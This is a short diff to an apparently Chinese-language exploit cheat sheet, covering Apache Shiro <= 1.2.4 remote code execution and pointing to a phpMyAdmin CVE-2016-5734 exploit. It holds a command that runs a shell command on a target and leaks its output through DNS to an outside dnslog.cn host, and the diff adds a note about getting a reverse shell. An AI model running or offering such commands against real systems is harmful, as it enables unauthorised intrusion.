@@ -9,8 +9,9 @@ http://dnslog.cn/
 影響範圍 :
 Apache Shiro <= 1.2.4
 use :
-利用 DNSLog 去接收是否資訊
+利用 DNSLog 去接收是否資訊(不回顯)
 python shiro_rce.py http://targetip:port/login "ping `whoami`.ssngky.dnslog.cn"
+或利用圖形化 GUI 界面進行反彈 Shell。
 
 # phpmyadmin(CVE-2016-5734)
 https://www.exploit-db.com/exploits/40185
